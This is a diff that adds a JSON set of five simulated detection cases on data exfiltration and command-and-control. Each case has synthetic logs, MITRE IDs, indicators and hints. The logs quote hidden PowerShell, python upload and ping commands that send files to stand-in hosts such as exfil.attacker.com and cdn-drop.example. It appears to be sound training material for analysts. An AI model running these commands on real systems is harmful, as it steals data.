@@ -1,0 +1,219 @@
+[
+  {
+    "id": 1,
+    "code": "SCN_DNS_EXFIL",
+    "title": "Case 1: DNS Exfiltration via TXT (ENG-03 → exfil.attacker.com)",
+    "logs": [
+      "2025-07-21T14:03:12Z ZEEK_DNS ENG-03 10.10.23.44 → 8.8.8.8 TXT qname=c3VwZXJzZWNyZXQxLmZpbGUucGFydC4xLmV4ZmlsLmF0dGFja2VyLmNvbQ==.exfil.attacker.com",
+      "2025-07-21T14:03:13Z ZEEK_DNS ENG-03 10.10.23.44 → 8.8.8.8 TXT qname=c3VwZXJzZWNyZXQyLmZpbGUucGFydC4yLmJhc2U2NA==.exfil.attacker.com",
+      "2025-07-21T14:03:15Z ZEEK_DNS ENG-03 10.10.23.44 → 8.8.8.8 TXT qname=LS0tRU5E--.exfil.attacker.com",
+      "2025-07-21T14:03:16Z SYS_4688 ENG-03 jdoe NewProcess: powershell.exe Cmd: powershell -nop -w hidden -c \"$d=[IO.File]::ReadAllBytes('C:\\Users\\jdoe\\Desktop\\quotes.xlsx');Split-ToDns $d\"",
+      "2025-07-21T14:03:18Z SYS_3 (Sysmon NetConn) ENG-03 powershell.exe → 8.8.8.8:53 UDP"
+    ],
+    "telemetry": [
+      "EDR Alert: PowerShell script blocks with DNS TXT beaconing pattern; parent=explorer.exe; user=jdoe",
+      "EDR Trace: Script allocated ~64KB, emitted >200 DNS TXT requests in burst"
+    ],
+    "palette": {
+      "title_suggestions": [
+        "DNS Exfiltration via TXT Records",
+        "Data Exfiltration over DNS",
+        "Exfiltration: DNS TXT chunking"
+      ],
+      "mitre": [
+        "T1071.004",
+        "T1132",
+        "T1041",
+        "T1027",
+        "T1568",
+        "T1005"
+      ],
+      "hosts": [
+        "ENG-03",
+        "WS-19",
+        "SRV-DC01"
+      ],
+      "accounts": [
+        "jdoe",
+        "svc_backup",
+        "it.ops"
+      ],
+      "iocs": [
+        "exfil.attacker.com",
+        "8.8.8.8",
+        "TXT",
+        "base64 chunk"
+      ]
+    },
+    "hints": [
+      "Look for base64-like labels and TXT bursts.",
+      "Correlate PowerShell execution with DNS."
+    ]
+  },
+  {
+    "id": 2,
+    "code": "SCN_ICMP_EXFIL",
+    "title": "Case 2: ICMP Exfiltration (WS-07 → 203.0.113.45)",
+    "logs": [
+      "2025-07-22T09:18:41Z ZEEK_ICMP WS-07 10.10.12.77 -> 203.0.113.45 type=8 code=0 payload_len=1400",
+      "2025-07-22T09:18:42Z ZEEK_ICMP WS-07 10.10.12.77 -> 203.0.113.45 type=8 code=0 payload_len=1400",
+      "2025-07-22T09:18:43Z SYS_4688 WS-07 msmith NewProcess: cmd.exe /c ping -n 60 -l 1400 203.0.113.45",
+      "2025-07-22T09:18:45Z SYS_3 (Sysmon NetConn) WS-07 cmd.exe → 203.0.113.45:icmp"
+    ],
+    "telemetry": [
+      "EDR: Sustained ICMP echo with large payload by msmith."
+    ],
+    "palette": {
+      "title_suggestions": [
+        "Exfiltration over ICMP Echo",
+        "ICMP-based Data Exfiltration",
+        "Covert Exfil via Ping Payload"
+      ],
+      "mitre": [
+        "T1048",
+        "T1095",
+        "T1041",
+        "T1027"
+      ],
+      "hosts": [
+        "WS-07",
+        "ENG-03"
+      ],
+      "accounts": [
+        "msmith",
+        "jdoe"
+      ],
+      "iocs": [
+        "203.0.113.45",
+        "ping -l 1400"
+      ]
+    },
+    "hints": [
+      "Check payload sizes and sustained rate (n=60)."
+    ]
+  },
+  {
+    "id": 3,
+    "code": "SCN_HTTPS_EXFIL",
+    "title": "Case 3: HTTPS Exfiltration (FIN-11 → cdn-drop.example)",
+    "logs": [
+      "2025-07-24T22:47:02Z PROXY FIN-11 10.10.44.23 → 198.51.100.120 TLS SNI=cdn-drop.example POST /upload size=12.8MB UA=python-requests/2.31",
+      "2025-07-24T22:47:03Z SYS_4688 FIN-11 analyst NewProcess: python.exe C:\\Tools\\upload.py --dst https://cdn-drop.example/upload --file C:\\Finance\\Ledger\\Q3.zip",
+      "2025-07-24T22:47:05Z EDR Telemetry: python.exe opened C:\\Finance\\Ledger\\Q3.zip (size 12.7MB)"
+    ],
+    "telemetry": [
+      "EDR: Large POST to non-approved SNI from finance workstation."
+    ],
+    "palette": {
+      "title_suggestions": [
+        "HTTPS Data Exfiltration (Unapproved Endpoint)",
+        "Exfiltration over TLS to External Host"
+      ],
+      "mitre": [
+        "T1041",
+        "T1071.001",
+        "T1560",
+        "T1027"
+      ],
+      "hosts": [
+        "FIN-11",
+        "SRV-FILE01"
+      ],
+      "accounts": [
+        "analyst",
+        "svc_backup"
+      ],
+      "iocs": [
+        "cdn-drop.example",
+        "198.51.100.120"
+      ]
+    },
+    "hints": [
+      "Non-corporate SNI + bulk POST upload."
+    ]
+  },
+  {
+    "id": 4,
+    "code": "SCN_C2_HTTP",
+    "title": "Case 4: Command & Control over HTTP (WS-19 beaconing)",
+    "logs": [
+      "2025-07-26T03:04:11Z PROXY WS-19 10.10.29.65 → 203.0.113.99 GET /beacon?id=WS-19&v=1.2 UA=Moz/5.0 (interval 60s)",
+      "2025-07-26T03:05:12Z PROXY WS-19 10.10.29.65 → 203.0.113.99 GET /task?id=WS-19 → 200 {\"cmd\":\"whoami && ipconfig\"}",
+      "2025-07-26T03:05:13Z SYS_4688 WS-19 jdoe NewProcess: cmd.exe /c whoami && ipconfig",
+      "2025-07-26T03:06:12Z PROXY WS-19 10.10.29.65 → 203.0.113.99 POST /result (len=4KB)"
+    ],
+    "telemetry": [
+      "EDR: Scheduled task spawns beacon.exe; periodic HTTP."
+    ],
+    "palette": {
+      "title_suggestions": [
+        "HTTP Beacon with Tasking & Results",
+        "C2 over HTTP with Command Execution"
+      ],
+      "mitre": [
+        "T1071.001",
+        "T1059.003",
+        "T1053",
+        "T1105"
+      ],
+      "hosts": [
+        "WS-19",
+        "ENG-03"
+      ],
+      "accounts": [
+        "jdoe",
+        "it.ops"
+      ],
+      "iocs": [
+        "203.0.113.99",
+        "/beacon",
+        "/task"
+      ]
+    },
+    "hints": [
+      "Note beacon interval and tasking pattern."
+    ]
+  },
+  {
+    "id": 5,
+    "code": "SCN_C2_HTTPS",
+    "title": "Case 5: Command & Control over HTTPS (LAP-DEV01, encrypted)",
+    "logs": [
+      "2025-07-28T16:35:20Z ZEEK_SSL LAP-DEV01 10.10.55.10 → 198.51.100.200 JA3=769,4865,4867 sni=cdn-c2.example",
+      "2025-07-28T16:36:20Z PROXY LAP-DEV01 10.10.55.10 → 198.51.100.200 POST /b (len=1.2KB) UA=Chrome/112",
+      "2025-07-28T16:36:21Z SYS_4688 LAP-DEV01 dev.build NewProcess: powershell.exe -nop -w hidden -enc SQB... (decoded: Invoke-Command 'dir C:\\' )"
+    ],
+    "telemetry": [
+      "EDR: Beacon via TLS; child PowerShell EncodedCommand."
+    ],
+    "palette": {
+      "title_suggestions": [
+        "Encrypted C2 over HTTPS with PowerShell",
+        "HTTPS Beacon (JA3) + EncodedCommand"
+      ],
+      "mitre": [
+        "T1071.001",
+        "T1059.001",
+        "T1573",
+        "T1140",
+        "T1001"
+      ],
+      "hosts": [
+        "LAP-DEV01",
+        "ENG-03"
+      ],
+      "accounts": [
+        "dev.build",
+        "msmith"
+      ],
+      "iocs": [
+        "cdn-c2.example",
+        "198.51.100.200",
+        "JA3"
+      ]
+    },
+    "hints": [
+      "Correlate JA3/TLS beacons with PowerShell."
+    ]
+  }
+]
